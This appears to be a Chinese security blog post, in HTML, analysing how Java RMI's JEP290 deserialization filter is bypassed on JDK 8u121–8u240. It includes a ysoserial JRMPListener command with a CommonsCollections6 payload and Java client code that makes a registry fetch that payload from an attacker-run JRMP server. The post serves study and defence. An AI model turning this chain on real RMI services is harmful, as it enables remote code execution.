@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="zh" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>RMI JEP290 | Jiecub3</title>
+<meta name="keywords" content="">
+<meta name="description" content="前言：其实是写了RMI反序列化以及3端互打的，但是感觉基本上都是摘抄网上的有点啰嗦就删了。然后下文主要是讲绕过RMI反序列化中的JEP290">
+<meta name="author" content="Jiecub3">
+<link rel="canonical" href="https://Jiecub3.github.io/zh/posts/java/rmi-jep290/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.6498a9db1bad4c0d045c3aa5ba217809694eb596cf8fff3516fcb871a2dfe03e.css" integrity="sha256-ZJip2xutTA0EXDqluiF4CWlOtZbPj/81Fvy4caLf4D4=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://Jiecub3.github.io/img/logo.gif">
+<link rel="icon" type="image/png" sizes="16x16" href="https://Jiecub3.github.io/img/logo.gif">
+<link rel="icon" type="image/png" sizes="32x32" href="https://Jiecub3.github.io/img/logo.gif">
+<link rel="apple-touch-icon" href="https://Jiecub3.github.io/logo.gif">
+<link rel="mask-icon" href="https://Jiecub3.github.io/logo.gif">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh" href="https://Jiecub3.github.io/zh/posts/java/rmi-jep290/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:title" content="RMI JEP290" />
+<meta property="og:description" content="前言：其实是写了RMI反序列化以及3端互打的，但是感觉基本上都是摘抄网上的有点啰嗦就删了。然后下文主要是讲绕过RMI反序列化中的JEP290" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://Jiecub3.github.io/zh/posts/java/rmi-jep290/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2025-01-17T20:01:23+08:00" />
+<meta property="article:modified_time" content="2025-01-17T20:01:23+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="RMI JEP290"/>
+<meta name="twitter:description" content="前言：其实是写了RMI反序列化以及3端互打的，但是感觉基本上都是摘抄网上的有点啰嗦就删了。然后下文主要是讲绕过RMI反序列化中的JEP290"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://Jiecub3.github.io/zh/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "RMI JEP290",
+      "item": "https://Jiecub3.github.io/zh/posts/java/rmi-jep290/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "RMI JEP290",
+  "name": "RMI JEP290",
+  "description": "前言：其实是写了RMI反序列化以及3端互打的，但是感觉基本上都是摘抄网上的有点啰嗦就删了。然后下文主要是讲绕过RMI反序列化中的JEP290",
+  "keywords": [
+    
+  ],
+  "articleBody": " 前言：其实是写了RMI反序列化以及3端互打的，但是感觉基本上都是摘抄网上的有点啰嗦就删了。然后下文主要是讲绕过RMI反序列化中的JEP290。然后笔者是把其绕过原理理解成2条通信（或者说线程）而设置JEP290只作用于第一条通信，通过第二条通信进行绕过\nJEP290 参考很多这篇文章，https://www.anquanke.com/post/id/259059#h3-1\nJEP290干嘛的，简单说就是一个防御反序列化攻击的黑白名单过滤器\n提供一个限制反序列化类的机制，白名单或者黑名单 限制反序列化的深度和复杂度 为 RMI 远程调用对象提供了一个验证类的机制 定义一个可配置的过滤机制，比如可以通过配置properties文件的形式来定义过滤器。 JEP290支持的版本：\nJava™ SE Development Kit 8, Update 121 (JDK 8u121) Java™ SE Development Kit 7, Update 131 (JDK 7u131) Java™ SE Development Kit 6, Update 141 (JDK 6u141) 设置JEP290的方式有下面两种：\n通过setObjectInputFilter来设置filter 直接通过conf/security/java.properties文件进行配置 JEP290应用 在RMI反序列化中应用在register端，比如bind绑定对象时，JEP290是需要设置的，像Client和Server之间的互打则没有JEP290的检测，所以之后的版本还是能相互打。\n在8u121后，java在oldDispatch#unmarshalCustomCallData()中通过setObjectInputFilter进行设置\n这里UnicastServerRef.this.filter存储的是一个表达式RegistryImpl::registryFilter，这也是为什么后面会调到这个registryFilter方法进行检测\nJEP290作用点 没有JEP290时，我们通过下图readObject就可以成功实现反序列化攻击\nJEP290作用点也在这个readObject中，这里serialFilter就是前面的filter(RegistryImpl::registryFilter)，进入registryFilter，registryFilter就是JEP290设置的过滤Filter，这里会先将需要反序列化的类进行白名单检测(就是这个return判断)，然后再进行反序列化\n白名单如下：\nString.class Number.class Remote.class Proxy.class UnicastRef.class RMIClientSocketFactory.class RMIServerSocketFactory.class ActivationID.class UID.class 这里我们的恶意对象不在白名单中，从而导致我们反序列化攻击失败\nBypass 8u121~8u230 这里绕过思路是，serialFilter作用于我们的恶意Server端和Register端的反序列化，但其实在这个过程中还存在一段通信，而这段通信中的serialFilter和第一段通信的serialFilter是相互独立的，及第二段通信反序列化不会有这个检测，且这段通信的数据也是序列化传输的，所以如果我们可以在第一段流程中控制第二段通信的服务地址，连接上我们的恶意服务，返回恶意反序列化内容即可反序列化攻击成功，光看这段描述可能不太能理解，不用担心，可以看看下面具体分析\n实现demo 这里攻击的是register\n依次执行下面命令和java文件\nC:\\MyFiles\\Tools\\ENV\\JAVA\\jdk1.8.0_192\\bin\\java.exe -cp ysoserial.jar ysoserial.exploit.JRMPListener 3333 CommonsCollections6 \"calc\" RMIRegistry\npackage JEP290; import java.rmi.registry.LocateRegistry; public class RMIRegistry { public static void main(String[] args) { try { LocateRegistry.createRegistry(1099); System.out.println(\"RMI Registry Start\"); } catch (Exception e) { e.printStackTrace(); } while (true) ; } } DefineClient\npackage JEP290; import com.example.HelloImpl; import sun.rmi.server.UnicastRef; import sun.rmi.transport.LiveRef; import sun.rmi.transport.tcp.TCPEndpoint; import java.rmi.Remote; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.rmi.server.ObjID; import java.rmi.server.RemoteObjectInvocationHandler; import java.util.Random; public class DefineClient { public static void main(String[] args) throws Exception { Registry registry = LocateRegistry.getRegistry(1099); ObjID id = new ObjID(new Random().nextInt()); TCPEndpoint te = new TCPEndpoint(\"localhost\", 3333); UnicastRef ref = new UnicastRef(new LiveRef(id, te, false)); RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler(ref); // lookup方法也可以，但需要手动模拟lookup方法的流程 registry.bind(\"pwn\", handler); } } 简单流程分析 在原先readOject下面这里var2.releaseInputStream();会进行第二段通信利用\n在registerRefs会得到JRMP段服务地址，这个值怎么初始化的后面会提到\n这里lookup其实没干什么，只是封装了下我们的var0\n后续在executeCall()中this.getInputStream();建立新的通讯，然后将接收序列化数据执行反序列化\n调用栈\nexecuteCall:220, StreamRemoteCall (sun.rmi.transport) invoke:375, UnicastRef (sun.rmi.server) dirty:109, DGCImpl_Stub (sun.rmi.transport) makeDirtyCall:382, DGCClient$EndpointEntry (sun.rmi.transport) registerRefs:324, DGCClient$EndpointEntry (sun.rmi.transport) registerRefs:160, DGCClient (sun.rmi.transport) registerRefs:102, ConnectionInputStream (sun.rmi.transport) releaseInputStream:157, StreamRemoteCall (sun.rmi.transport) dispatch:80, RegistryImpl_Skel (sun.rmi.registry) oldDispatch:468, UnicastServerRef (sun.rmi.server) dispatch:300, UnicastServerRef (sun.rmi.server) TCPEndpoint（JRMP段地址）的赋值 他的赋值其实是在原先反序列化利用点开始的\n我们设置的对象是专门继承RemoteObject(继承Remote在白名单上)的，到其的readObject，跟进ref.readExternal(in);\n跟进LiveRef.read\n这里会从序列化数据提取出ip和port，生成一个TCPEndpoint赋给var2，然后封装成一个LiveRef传到var6.saveRef()里\nsaveRef()里最后存在到incomingRefTable这个table里面，可以回头看利用分析，就是从这个变量取的对象\n2段通信 \u0026 serialFilter 这里有个点需要搞清楚关于serialFilter\n第一段通信\n第一段通信，第一段通信是建立于我们Server端bind(),向Register端进行数据传输，记住这里的ConnectionInputStream@982编号，他的super的super既是ObjectInputStream(存储serialFilter)\n然后没有特别设置的话，serialFilter是为null的\n第一段通信中，我们知道在unmarshalCustomCallData()中给this.serialFilter设置了值，注意这里编号ConnectionInputStream@982\n第二段通信，JRMP协议\n注意到UnicastRef#invoke=\u003eexecuteCall()=\u003ethis.getInputStream();会建立新的通信，这里编号为ConnectionInputStream@1160\npublic ObjectInput getInputStream() throws IOException { if (this.in == null) { Transport.transportLog.log(Log.VERBOSE, \"getting input stream\"); this.in = new ConnectionInputStream(this.conn.getInputStream()); } return this.in; } 进行初始化，所以这里serialFilter为null，并不存在第一段通信设置的值\n及反序列化的时候也不会存在检测\n小结:\n这里我想表达什么呢，就是分清楚，这种方法为什么可以绕过JEP290，第一段通信是和Server端，第二段是和JMRP端。这里ConnectionInputStream其实就代表着ObjectInputStream，而第一段通信中设置的serialFilter只作用于第一段通信中，及只作用于Register和Server之间的readObject中！！（JEP290作用域）\n相信对上面的分析，对JEP290有比较清晰的理解了\n修复：\n在dirty()方法中建立通讯后，给this.filter设置了一个JEP290(表达式)\n然后在this.in的serialFilter中设置上这个filter\n然后被检测出来\nBypass 8u231~8u240 在8u231之前我们是通过dirty()这里绕过的，然后被修复了。8u231这里这是通过直接达到UnicastRef#invoke，不经过dirty()，仅靠第一次反序列化完成这些操作。但是下一个版本就被修了hhh，具体可以参考这篇https://www.anquanke.com/post/id/259059#h3-10\n参考：\nhttps://xz.aliyun.com/t/8706?time__1311=n4%2BxnD0DcDu0eD5Y40HpDUhEIDkB711H4D#toc-8\nhttps://www.anquanke.com/post/id/259059#h3-1\n",
+  "wordCount" : "2858",
+  "inLanguage": "zh",
+  "datePublished": "2025-01-17T20:01:23+08:00",
+  "dateModified": "2025-01-17T20:01:23+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "Jiecub3"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://Jiecub3.github.io/zh/posts/java/rmi-jep290/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Jiecub3",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://Jiecub3.github.io/img/logo.gif"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://Jiecub3.github.io/zh/" accesskey="h" title="Jiecub3 (Alt + H)">Jiecub3</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://Jiecub3.github.io/zh/" title="首页">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Jiecub3.github.io/zh/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Jiecub3.github.io/zh/categories/" title="分类">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Jiecub3.github.io/zh/search" title="搜索🔍︎">
+                    <span>搜索🔍︎</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Jiecub3.github.io/zh/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://Jiecub3.github.io/zh/">🏠主页</a>&nbsp;»&nbsp;<a href="https://Jiecub3.github.io/zh/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      RMI JEP290
+    </h1>
+    <div class="post-meta"><span title='2025-01-17 20:01:23 +0800 CST'>2025-01-17</span>&nbsp;·&nbsp;6 分钟&nbsp;·&nbsp;Jiecub3
+
+</div>
+  </header> <aside id="toc-container" class="toc-container wide">
+    <div class="toc">
+        <details  open>
+            <summary accesskey="c" title="(Alt + C)">
+                <span class="details">目录</span>
+            </summary>
+
+            <div class="inner"><ul>
+                    <li>
+                        <a href="#jep290" aria-label="JEP290">JEP290</a><ul>
+                            
+                    <li>
+                        <a href="#jep290%e5%ba%94%e7%94%a8" aria-label="JEP290应用"><strong>JEP290应用</strong></a></li>
+                    <li>
+                        <a href="#jep290%e4%bd%9c%e7%94%a8%e7%82%b9" aria-label="JEP290作用点">JEP290作用点</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#bypass-8u1218u230" aria-label="Bypass 8u121~8u230">Bypass 8u121~8u230</a><ul>
+                            
+                    <li>
+                        <a href="#%e5%ae%9e%e7%8e%b0demo" aria-label="实现demo">实现demo</a></li>
+                    <li>
+                        <a href="#%e7%ae%80%e5%8d%95%e6%b5%81%e7%a8%8b%e5%88%86%e6%9e%90" aria-label="简单流程分析">简单流程分析</a><ul>
+                            
+                    <li>
+                        <a href="#tcpendpointjrmp%e6%ae%b5%e5%9c%b0%e5%9d%80%e7%9a%84%e8%b5%8b%e5%80%bc" aria-label="TCPEndpoint（JRMP段地址）的赋值">TCPEndpoint（JRMP段地址）的赋值</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#2%e6%ae%b5%e9%80%9a%e4%bf%a1--serialfilter" aria-label="2段通信 &amp;amp; serialFilter"><strong>2段通信</strong> &amp; serialFilter</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#bypass-8u2318u240" aria-label="Bypass 8u231~8u240">Bypass 8u231~8u240</a>
+                    </li>
+                </ul>
+            </div>
+        </details>
+    </div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    
+    document.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+    
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+        if (elements.length > 0) {
+            
+            activeElement = elements[0];
+            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+        }
+    
+        
+        const topLink = document.getElementById('top-link');
+        if (topLink) {
+            topLink.addEventListener('click', (event) => {
+                
+                event.preventDefault();
+    
+                
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+        }
+    }, false);
+    
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+    
+    window.addEventListener('scroll', () => {
+        
+        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
+    
+        
+        if (scrollPosition === 0) {
+            return;
+        }
+    
+        
+        if (elements && elements.length > 0) {
+            
+            activeElement = Array.from(elements).find((element) => {
+                if ((getOffsetTop(element) - scrollPosition) > 0 && 
+                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
+                    return element;
+                }
+            }) || activeElement;
+    
+            elements.forEach(element => {
+                const id = encodeURI(element.getAttribute('id')).toLowerCase();
+                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
+                if (element === activeElement){
+                    tocLink.classList.add('active');
+    
+                    
+                    const tocContainer = document.querySelector('.toc .inner');
+                    const linkOffsetTop = tocLink.offsetTop;
+                    const containerHeight = tocContainer.clientHeight;
+                    const linkHeight = tocLink.clientHeight;
+    
+                    
+                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
+                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
+                } else {
+                    tocLink.classList.remove('active');
+                }
+            });
+        }
+    }, false);
+    
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+    
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+    
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+    
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;   
+    }
+    
+</script>
+
+  <div class="post-content"><blockquote>
+<p>前言：其实是写了RMI反序列化以及<code>3端互打</code>的，但是感觉基本上都是摘抄网上的有点啰嗦就删了。然后下文主要是讲绕过<code>RMI反序列化</code>中的JEP290。然后笔者是把其绕过原理理解成2条通信（或者说线程）而设置JEP290只作用于第一条通信，通过第二条通信进行绕过</p>
+</blockquote>
+<h2 id="jep290">JEP290<a hidden class="anchor" aria-hidden="true" href="#jep290">#</a></h2>
+<p>参考很多这篇文章，https://www.anquanke.com/post/id/259059#h3-1</p>
+<p>JEP290干嘛的，简单说就是一个<code>防御反序列化攻击</code>的黑白名单<code>过滤器</code></p>
+<blockquote>
+<ol>
+<li>提供一个限制反序列化类的机制，白名单或者黑名单</li>
+<li>限制反序列化的深度和复杂度</li>
+<li>为 RMI 远程调用对象提供了一个验证类的机制</li>
+<li>定义一个可配置的过滤机制，比如可以通过配置properties文件的形式来定义过滤器。</li>
+</ol>
+</blockquote>
+<p>JEP290支持的版本：</p>
+<ul>
+<li>Java™ SE Development Kit 8, Update 121 (JDK 8u121)</li>
+<li>Java™ SE Development Kit 7, Update 131 (JDK 7u131)</li>
+<li>Java™ SE Development Kit 6, Update 141 (JDK 6u141)</li>
+</ul>
+<p>设置JEP290的方式有下面两种：</p>
+<blockquote>
+<ol>
+<li>通过setObjectInputFilter来设置filter</li>
+<li>直接通过conf/security/java.properties文件进行配置</li>
+</ol>
+</blockquote>
+<h3 id="jep290应用"><strong>JEP290应用</strong><a hidden class="anchor" aria-hidden="true" href="#jep290应用">#</a></h3>
+<blockquote>
+<p>在<code>RMI反序列化</code>中应用在<code>register端</code>，比如<code>bind绑定对象</code>时，<code>JEP290是需要设置的</code>，像Client和Server之间的互打则没有JEP290的检测，所以之后的版本还是能相互打。</p>
+</blockquote>
+<p>在8u121后，java在<code>oldDispatch#unmarshalCustomCallData()</code>中通过<code>setObjectInputFilter</code>进行设置</p>
+<p><img loading="lazy" src="images/image-20250116164428155.png" alt="image-20250116164428155"  />
+</p>
+<p><img loading="lazy" src="images/image-20250116164635356.png" alt="image-20250116164635356"  />
+</p>
+<p>这里<code>UnicastServerRef.this.filter</code>存储的是一个表达式<code>RegistryImpl::registryFilter</code>，这也是为什么后面会调到这个<code>registryFilter</code>方法进行检测</p>
+<p><img loading="lazy" src="images/image-20250116170131417.png" alt="image-20250116170131417"  />
+</p>
+<h3 id="jep290作用点">JEP290作用点<a hidden class="anchor" aria-hidden="true" href="#jep290作用点">#</a></h3>
+<p>没有JEP290时，我们通过下图<code>readObject</code>就可以成功实现<code>反序列化攻击</code></p>
+<p><img loading="lazy" src="images/image-20250116163537694.png" alt="image-20250116163537694"  />
+</p>
+<p>JEP290作用点也在这个<code>readObject</code>中，这里<code>serialFilter</code>就是前面的<code>filter(RegistryImpl::registryFilter)</code>，进入<code>registryFilter</code>，<code>registryFilter</code>就是JEP290设置的过滤Filter，这里会先将需要<code>反序列化的类</code>进行<code>白名单检测(就是这个return判断)</code>，然后再进行反序列化</p>
+<p><img loading="lazy" src="images/image-20250116171006272.png" alt="image-20250116171006272"  />
+</p>
+<p><img loading="lazy" src="images/image-20250116165212572.png" alt="image-20250116165212572"  />
+</p>
+<p>白名单如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">String.class
+</span></span><span class="line"><span class="cl">Number.class
+</span></span><span class="line"><span class="cl">Remote.class
+</span></span><span class="line"><span class="cl">Proxy.class
+</span></span><span class="line"><span class="cl">UnicastRef.class
+</span></span><span class="line"><span class="cl">RMIClientSocketFactory.class
+</span></span><span class="line"><span class="cl">RMIServerSocketFactory.class
+</span></span><span class="line"><span class="cl">ActivationID.class
+</span></span><span class="line"><span class="cl">UID.class
+</span></span></code></pre></div><p>这里我们的恶意对象不在白名单中，从而导致我们反序列化攻击失败</p>
+<h2 id="bypass-8u1218u230">Bypass 8u121~8u230<a hidden class="anchor" aria-hidden="true" href="#bypass-8u1218u230">#</a></h2>
+<blockquote>
+<p>这里绕过思路是，<code>serialFilter</code>作用于我们的恶意Server端和Register端的反序列化，但其实在这个过程中还存在一段通信，而这段通信中的<code>serialFilter</code>和第一段通信的<code>serialFilter</code>是相互独立的，及第二段通信反序列化不会有这个<code>检测</code>，且这段通信的数据也是<code>序列化传输</code>的，所以如果我们可以在第一段流程中<code>控制</code>第二段通信的<code>服务地址</code>，连接上我们的恶意服务，返回<code>恶意反序列化内容</code>即可反序列化攻击成功，光看这段描述可能不太能理解，不用担心，可以看看下面具体分析</p>
+</blockquote>
+<h3 id="实现demo">实现demo<a hidden class="anchor" aria-hidden="true" href="#实现demo">#</a></h3>
+<p>这里攻击的是<code>register</code></p>
+<p>依次执行下面命令和java文件</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">MyFiles</span><span class="err">\</span><span class="n">Tools</span><span class="err">\</span><span class="n">ENV</span><span class="err">\</span><span class="n">JAVA</span><span class="err">\</span><span class="n">jdk1</span><span class="p">.</span><span class="na">8</span><span class="p">.</span><span class="na">0_192</span><span class="err">\</span><span class="n">bin</span><span class="err">\</span><span class="n">java</span><span class="p">.</span><span class="na">exe</span><span class="w"> </span><span class="o">-</span><span class="n">cp</span><span class="w"> </span><span class="n">ysoserial</span><span class="p">.</span><span class="na">jar</span><span class="w"> </span><span class="n">ysoserial</span><span class="p">.</span><span class="na">exploit</span><span class="p">.</span><span class="na">JRMPListener</span><span class="w"> </span><span class="n">3333</span><span class="w"> </span><span class="n">CommonsCollections6</span><span class="w"> </span><span class="s">&#34;calc&#34;</span><span class="w">
+</span></span></span></code></pre></div><p>RMIRegistry</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">JEP290</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.LocateRegistry</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">RMIRegistry</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">LocateRegistry</span><span class="p">.</span><span class="na">createRegistry</span><span class="p">(</span><span class="n">1099</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;RMI Registry Start&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>DefineClient</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">JEP290</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.example.HelloImpl</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">sun.rmi.server.UnicastRef</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">sun.rmi.transport.LiveRef</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">sun.rmi.transport.tcp.TCPEndpoint</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.Remote</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.LocateRegistry</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.Registry</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.server.ObjID</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.server.RemoteObjectInvocationHandler</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Random</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">DefineClient</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Registry</span><span class="w"> </span><span class="n">registry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LocateRegistry</span><span class="p">.</span><span class="na">getRegistry</span><span class="p">(</span><span class="n">1099</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjID</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjID</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Random</span><span class="p">().</span><span class="na">nextInt</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TCPEndpoint</span><span class="w"> </span><span class="n">te</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TCPEndpoint</span><span class="p">(</span><span class="s">&#34;localhost&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">3333</span><span class="p">);</span><span class="w">
